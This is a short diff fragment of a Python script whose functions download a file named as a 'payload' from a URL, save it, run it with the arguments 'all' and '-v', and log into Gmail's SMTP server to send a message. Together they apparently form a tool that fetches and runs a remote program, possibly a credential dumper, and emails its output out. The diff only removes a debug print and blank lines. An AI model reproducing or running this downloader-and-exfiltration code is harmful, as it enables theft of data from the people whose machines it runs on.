@@ -5,11 +5,9 @@ import requests
 
 def get_payload():
         get_request = requests.get(url)
-        print(get_request.content)
         name = url.split("/")[-1]
         with open(name, "wb") as payload:
             payload.write(get_request.content)
-
 def execute(prgm):
     process = subprocess.Popen([prgm, 'all', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     result, error = process.communicate()
@@ -17,7 +15,6 @@ def execute(prgm):
         return result.decode('latin-1').encode("utf-8")
     except:
         return str(result)
-
 def mail_it(email, passwd, to_mail, msg):
     mailserver = smtplib.SMTP("smtp.gmail.com", 587)
     mailserver.starttls()
